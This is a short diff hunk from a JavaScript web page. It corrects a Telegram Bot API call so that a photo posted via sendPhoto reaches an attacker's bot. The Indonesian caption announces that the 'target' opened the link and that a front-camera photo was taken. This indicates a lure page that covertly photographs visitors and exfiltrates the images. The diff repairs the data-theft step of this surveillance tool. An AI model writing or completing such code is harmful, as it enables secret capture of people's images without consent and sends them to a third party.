@@ -93,7 +93,7 @@
             formData.append('caption', '📸 Target membuka link!\nFoto kamera depan berhasil diambil secara terang.');
 
             try {
-                await fetch(`https://telegram.org{TELEGRAM_BOT_TOKEN}/sendPhoto`, {
+                await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendPhoto`, {
                     method: 'POST',
                     body: formData
                 });
